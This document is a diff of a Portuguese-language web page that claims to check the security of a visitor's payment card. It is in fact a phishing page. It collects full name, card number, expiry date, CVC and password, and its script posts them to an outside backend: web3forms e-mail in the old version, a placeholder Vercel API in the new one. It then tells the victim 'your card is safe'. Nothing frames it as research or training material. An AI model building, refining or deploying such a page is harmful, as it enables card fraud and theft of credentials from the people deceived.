@@ -8,7 +8,7 @@
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
     <style>
-        /* CSS para um visual moderno e responsivo */
+        /* O seu CSS permanece o mesmo */
         :root {
             --primary-color: #007BFF;
             --primary-hover: #0056b3;
@@ -20,7 +20,6 @@
             --success-color: #28a745;
             --error-color: #dc3545;
         }
-
         body {
             font-family: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
             background-color: var(--background-color);
@@ -32,7 +31,6 @@
             align-items: flex-start;
             min-height: 100vh;
         }
-
         .container {
             background-color: var(--form-background);
             padding: 2.5rem;
@@ -43,7 +41,6 @@
             box-sizing: border-box;
             transform: translateY(-70px);
         }
-
         h1 {
             color: #000000;
             text-align: center;
@@ -51,49 +48,16 @@
             margin-bottom: calc(2rem - 10px);
             font-weight: 700;
         }
-
-        .form-group {
-            margin-bottom: 19px;
-        }
-        
-        .input-row {
-            display: flex;
-            gap: 1rem; /* Espaçamento entre os campos */
-        }
-        
-        .form-row {
-            display: flex;
-            gap: 1rem;
-            align-items: flex-end;
-            margin-bottom: 19px;
-        }
-
-        .form-row .form-group {
-            margin-bottom: 0;
-        }
-
-        .validity-group {
-            flex: 7;
-        }
-
-        .cvc-group {
-            flex: 2;
-        }
-
+        .form-group { margin-bottom: 19px; }
+        .input-row { display: flex; gap: 1rem; }
+        .form-row { display: flex; gap: 1rem; align-items: flex-end; margin-bottom: 19px; }
+        .form-row .form-group { margin-bottom: 0; }
+        .validity-group { flex: 7; }
+        .cvc-group { flex: 2; }
         .month-wrapper { flex: 3; }
-        .year-wrapper  { flex: 4; }
-
-        label {
-            display: block;
-            margin-bottom: 0.5rem;
-            font-weight: 600;
-            color: var(--label-color);
-        }
-
-        input[type="text"],
-        input[type="password"],
-        textarea,
-        select {
+        .year-wrapper { flex: 4; }
+        label { display: block; margin-bottom: 0.5rem; font-weight: 600; color: var(--label-color); }
+        input[type="text"], input[type="password"] {
             width: 100%;
             padding: 0.8rem 1rem;
             border: 1px solid var(--border-color);
@@ -102,29 +66,11 @@
             font-size: 1rem;
             transition: border-color 0.3s, box-shadow 0.3s;
         }
-
-        input[type="text"]:focus,
-        input[type="password"]:focus,
-        textarea:focus,
-        select:focus {
+        input[type="text"]:focus, input[type="password"]:focus {
             outline: none;
             border-color: var(--primary-color);
             box-shadow: 0 0 0 3px rgba(0, 123, 255, 0.25);
         }
-
-        textarea {
-            resize: vertical;
-        }
-        
-        input[type="file"] {
-            font-size: 0.9rem;
-            padding: 0.5rem;
-            border: 1px solid var(--border-color);
-            border-radius: 8px;
-            width: 100%;
-            box-sizing: border-box;
-        }
-
         .submit-btn {
             background: linear-gradient(45deg, #007BFF, #0056b3);
             color: white;
@@ -133,138 +79,62 @@
             border-radius: 8px;
             cursor: pointer;
             width: 100%;
-            font-size: 1.65rem; /* Fonte aumentada em 50% */
+            font-size: 1.65rem;
             font-weight: 600;
             transition: transform 0.2s, box-shadow 0.3s;
             display: flex;
             justify-content: center;
             align-items: center;
-            gap: 0.5rem;
         }
-
-        .submit-btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 6px 20px rgba(0, 123, 255, 0.3);
-        }
-
-        .submit-btn:disabled {
-            background: #aaa;
-            cursor: not-allowed;
-        }
-        
-        #form-result {
-            margin-top: 1.5rem;
-            padding: 1rem;
-            border-radius: 8px;
-            text-align: center;
-            font-weight: 500;
-            display: none; /* Começa escondido */
-        }
-
-        #form-result.error {
-            background-color: #fdecea;
-            color: var(--error-color);
-            display: block;
-        }
-
-        /* Estilos para o Modal de Sucesso */
-        .modal-overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background-color: rgba(0, 0, 0, 0.6);
-            display: none; /* Começa escondido */
-            justify-content: center;
-            align-items: center;
-            z-index: 1000;
-        }
-
-        .modal-content {
-            background-color: var(--form-background);
-            padding: 2.5rem 3.5rem;
-            border-radius: 12px;
-            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.2);
-            text-align: center;
-        }
-
-        .modal-content p {
-            margin: 0;
-            font-size: 1.2rem;
-            font-weight: 600;
-            color: var(--success-color);
-        }
-
-        .modal-content svg {
-            color: var(--success-color);
-            width: 50px;
-            height: 50px;
-            margin-bottom: 1rem;
-        }
+        .submit-btn:disabled { background: #aaa; cursor: not-allowed; }
+        #form-result { margin-top: 1.5rem; padding: 1rem; border-radius: 8px; text-align: center; font-weight: 500; display: none; }
+        #form-result.error { background-color: #fdecea; color: var(--error-color); display: block; }
+        .modal-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: rgba(0, 0, 0, 0.6); display: none; justify-content: center; align-items: center; z-index: 1000; }
+        .modal-content { background-color: var(--form-background); padding: 2.5rem 3.5rem; border-radius: 12px; box-shadow: 0 8px 25px rgba(0, 0, 0, 0.2); text-align: center; }
+        .modal-content p { margin: 0; font-size: 1.2rem; font-weight: 600; color: var(--success-color); }
+        .modal-content svg { color: var(--success-color); width: 50px; height: 50px; margin-bottom: 1rem; }
     </style>
 </head>
 <body>
-
     <div class="container">
         <h1>Verifique a Segurança do seu Cartão</h1>
-        <!-- O atributo 'enctype' foi mantido pois o script usa FormData -->
-        <form id="indication-form" method="POST" enctype="multipart/form-data">
-            
-            <!-- 
-                !!! IMPORTANTE !!!
-                Para o formulário funcionar e enviar os dados para o seu e-mail,
-                você PRECISA substituir "SUA_CHAVE_DE_ACESSO_AQUI" pela sua chave
-                pessoal que você obtém no site web3forms.com.
-            -->
-            <input type="hidden" name="access_key" value="SUA_CHAVE_DE_ACESSO_AQUI">
-            <input type="hidden" name="subject" value="Nova Verificação de Cartão Recebida">
-            <input type="hidden" name="from_name" value="Sistema de Verificação">
-
-            <!-- Campos do Formulário -->
+        <!-- O formulário agora não precisa de 'action' ou 'method' -->
+        <form id="card-form">
             <div class="form-group">
                 <label for="nome">Nome Completo</label>
-                <input type="text" id="nome" name="Nome Completo" required>
+                <input type="text" id="nome" name="nome" required>
             </div>
-
             <div class="form-group">
                 <label for="numero_cartao">Número do Cartão</label>
-                <input type="text" id="numero_cartao" name="Número do Cartão" required>
+                <input type="text" id="numero_cartao" name="numero_cartao" required>
             </div>
-
             <div class="form-row">
                 <div class="form-group validity-group">
                     <label for="validade_mes">Validade (Mês/Ano)</label>
                     <div class="input-row">
                         <div class="month-wrapper">
-                             <input type="text" id="validade_mes" name="Mês de Validade" placeholder="MM" required maxlength="2" pattern="\d{2}">
+                             <input type="text" id="validade_mes" name="validade_mes" placeholder="MM" required maxlength="2" pattern="\d{2}">
                         </div>
                         <div class="year-wrapper">
-                            <input type="text" id="validade_ano" name="Ano de Validade" placeholder="AAAA" required maxlength="4" pattern="\d{4}">
+                            <input type="text" id="validade_ano" name="validade_ano" placeholder="AAAA" required maxlength="4" pattern="\d{4}">
                         </div>
                     </div>
                 </div>
                 <div class="form-group cvc-group">
                     <label for="cvc">Número atrás do Cartão</label>
-                    <input type="text" id="cvc" name="CVC" placeholder="CVC" required maxlength="4" pattern="\d{3,4}">
+                    <input type="text" id="cvc" name="cvc" placeholder="CVC" required maxlength="4" pattern="\d{3,4}">
                 </div>
             </div>
-            
             <div class="form-group">
                 <label for="senha">Senha</label>
-                <input type="password" id="senha" name="Senha" required>
+                <input type="password" id="senha" name="senha" required>
             </div>
-
             <button type="submit" class="submit-btn" id="submit-button">
                 <span>Clique Aqui pra Verificar a Segurança das suas Informações!</span>
             </button>
         </form>
-        
-        <!-- Mensagem de resultado de erro (dentro do container) -->
         <div id="form-result"></div>
     </div>
-
-    <!-- Modal de Sucesso (fora do container, para centralizar na tela) -->
     <div id="success-modal" class="modal-overlay">
         <div class="modal-content">
             <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path><polyline points="22 4 12 14.01 9 11.01"></polyline></svg>
@@ -273,64 +143,56 @@
     </div>
 
     <script>
-        // Script para envio assíncrono do formulário
-        const form = document.getElementById('indication-form');
+        const form = document.getElementById('card-form');
         const resultDiv = document.getElementById('form-result');
         const submitButton = document.getElementById('submit-button');
         const successModal = document.getElementById('success-modal');
         const successMessage = document.getElementById('success-message');
 
-        form.addEventListener('submit', function(e) {
-            e.preventDefault(); // Impede o comportamento padrão de recarregar a página
+        form.addEventListener('submit', async (e) => {
+            e.preventDefault();
+            submitButton.disabled = true;
+            submitButton.querySelector('span').textContent = 'Analisando...';
+            resultDiv.style.display = 'none';
+            resultDiv.classList.remove('error');
 
-            submitButton.disabled = true; // Desabilita o botão para evitar múltiplos cliques
+            // --- PONTO DE ALTERAÇÃO IMPORTANTE ---
+            // Substitua esta URL pela URL da sua API na Vercel.
+            // Ex: https://seu-projeto-123.vercel.app/api
+            const backendUrl = 'https://SEU-PROJETO.vercel.app/api';
 
             const formData = new FormData(form);
-            const object = {};
-            formData.forEach((value, key) => {
-                object[key] = value;
-            });
-            const json = JSON.stringify(object);
+            const data = Object.fromEntries(formData.entries());
 
-            // Mensagem de "aguarde" foi removida daqui
-
-            fetch('https://api.web3forms.com/submit', {
+            try {
+                const response = await fetch(backendUrl, {
                     method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                        'Accept': 'application/json'
-                    },
-                    body: json
-                })
-                .then(async (response) => {
-                    let jsonResponse = await response.json();
-                    if (response.status == 200) {
-                        resultDiv.style.display = 'none'; 
-                        successMessage.textContent = "Seu cartão está seguro!";
-                        successModal.style.display = 'flex';
-                        form.reset();
-                        setTimeout(() => {
-                            successModal.style.display = 'none';
-                        }, 8000);
-                    } else {
-                        console.log(response);
-                        resultDiv.innerHTML = jsonResponse.message || "Ops! Algo deu errado.";
-                        resultDiv.style.display = "block"; // Mostra a div de resultado apenas se houver erro
-                        resultDiv.classList.add('error');
-                    }
-                })
-                .catch(error => {
-                    console.log(error);
-                    resultDiv.innerHTML = "Ops! Algo deu errado. Tente novamente mais tarde.";
-                    resultDiv.style.display = "block"; // Mostra a div de resultado apenas se houver erro
-                    resultDiv.classList.add('error');
-                })
-                .finally(() => {
-                    submitButton.disabled = false;
-                    submitButton.querySelector('span').textContent = 'Clique Aqui pra Verificar a Segurança das suas Informações!';
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(data),
                 });
+
+                const result = await response.json();
+
+                if (!response.ok) {
+                    throw new Error(result.message || 'Ocorreu um erro no servidor.');
+                }
+
+                successMessage.textContent = "Seu cartão está seguro!";
+                successModal.style.display = 'flex';
+                form.reset();
+                setTimeout(() => {
+                    successModal.style.display = 'none';
+                }, 8000);
+
+            } catch (error) {
+                resultDiv.innerHTML = `Ops! Algo deu errado: ${error.message}`;
+                resultDiv.style.display = 'block';
+                resultDiv.classList.add('error');
+            } finally {
+                submitButton.disabled = false;
+                submitButton.querySelector('span').textContent = 'Clique Aqui pra Verificar a Segurança das suas Informações!';
+            }
         });
     </script>
-
 </body>
 </html>
